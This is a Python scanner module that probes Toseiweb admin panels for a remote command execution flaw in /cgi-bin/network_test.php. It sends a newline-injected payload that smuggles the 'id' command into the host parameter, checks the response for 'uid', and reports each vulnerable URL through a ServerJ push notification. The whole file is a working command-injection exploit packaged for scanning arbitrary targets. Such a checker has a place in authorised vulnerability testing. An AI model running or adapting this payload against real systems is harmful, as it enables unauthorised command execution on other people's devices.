# Toseiweb_network_test_Command_scan.py
# "114.Toseiweb管理端network_test.php参数远程命令执行漏洞":

import ServerJ
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import os
import urllib.parse
import urllib.request

bugName="Toseiweb管理端network_test.php参数远程命令执行漏洞"
def scan_Toseiweb_network_test_Command(url, proxies, append_to_output, serverJ_key, bugName):
    path = "/cgi-bin/network_test.php"


    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url

    headers = {
        'Content-Length': '26',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Origin': url,
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Referer': f'{url}/cgi-bin/network_test.php',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close'
    }

    target_url = url + path
    data = '''host=%0aid%0a&command=ping'''
    append_to_output("===================================================================", "green")
    append_to_output(f"扫描目标: {url}", "yellow")
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        req1 = requests.post(target_url, data=data, headers=headers, verify=False, timeout=20, proxies=proxies)

        if req1.status_code == 200 and 'uid' in req1.text:
            append_to_output(f"[+] {url} 存在{bugName}！！！！", "red")
            ServerJ.sc_send(bugName, f"漏洞连接: {url}\r ", ServerJ_Key=serverJ_key)
        else:
            append_to_output(f"[-] {url} 不存在{bugName}", "green")
    except requests.Timeout:
        append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
    except requests.ConnectionError as conn_err:
        append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
    except Exception as e:
        if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
            append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
        else:
            append_to_output(str(e), "yellow")
